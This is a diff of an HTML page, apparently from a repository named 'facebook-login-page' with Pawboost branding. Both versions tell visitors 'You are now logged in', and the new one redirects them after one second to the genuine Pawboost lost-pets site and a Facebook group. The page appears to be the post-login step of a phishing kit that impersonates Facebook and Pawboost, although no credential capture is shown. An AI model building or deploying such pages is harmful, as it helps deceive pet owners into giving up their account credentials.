@@ -1,12 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-   <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
-
-  <title>Follow our page - Pawboost Community Find Lost Pets</title>
-  <link rel="stylesheet" href="style.css"> <!-- Optional: your external CSS -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/lindamarie-11/facebook-login-page/98ca4b4b0fe54f7ba544c172d05dcc8e36368c44/pawboost.png" />
+  <title>Redirecting - Pawboost Community</title>
 
   <style>
     body {
@@ -19,31 +17,37 @@
       align-items: center;
       min-height: 100vh;
     }
-    .login-container {
-      background: white;
+
+    .container {
+      background-color: white;
       padding: 40px;
       border-radius: 8px;
       box-shadow: 0 2px 4px rgba(0,0,0,0.1);
       text-align: center;
       max-width: 400px;
     }
+
     h2 {
       color: #1877f2;
       margin-bottom: 20px;
     }
+
     p {
       color: #606770;
       margin-bottom: 20px;
     }
+
     a {
       color: #1877f2;
       text-decoration: none;
       font-weight: bold;
     }
+
     a:hover {
       text-decoration: underline;
     }
-    button {
+
+    .button {
       background-color: #1877f2;
       color: white;
       border: none;
@@ -51,35 +55,30 @@
       border-radius: 6px;
       cursor: pointer;
       font-size: 16px;
+      margin-top: 10px;
     }
-    button:hover {
+
+    .button:hover {
       background-color: #165fc1;
     }
   </style>
 
   <!-- Auto redirect after 1 second -->
   <script>
-    window.onload = function() {
-      setTimeout(function() {
-        window.location.href = "https://www.pawboost.com/lost-found-pets/index?LfdbFeedStatusForm%5Bzip%5D=20151";
-      }, 100);
+    window.onload = function () {
+      setTimeout(function () {
+        window.location.href = "https://www.pawboost.com/lost-found-pets/jimmy-buffett-mem-hwy-fl-/all-lost-pets/page-1?LfdbFeedStatusForm%5Bzip%5D=A1A";
+      }, 1000); // 1 second delay
     };
   </script>
 </head>
+
 <body>
-  <div class="login-container">
-    <h2>Welcome to Facebook</h2>
-    <p>You are now logged in.</p>
-
-    <!-- Facebook group link -->
-    <p>
-      Visit our group:
-      <a href="https://www.facebook.com/groups/569116587524527/" target="_blank">
-        Facebook Group
-      </a>
-    </p>
-
-    <button onclick="logoutUser()">Log Out</button>
+  <div class="container">
+    <h2>Redirecting You…</h2>
+    <p>You are now logged in. Taking you to Pawboost Community Lost Pets Page.</p>
+    <p>If you are not redirected, <a href="https://www.pawboost.com/lost-found-pets/jimmy-buffett-mem-hwy-fl-/all-lost-pets/page-1?LfdbFeedStatusForm%5Bzip%5D=A1A">click here</a>.</p>
+    <a class="button" href="https://www.facebook.com/groups/569116587524527/" target="_blank">Visit Our Facebook Group</a>
   </div>
 </body>
 </html>
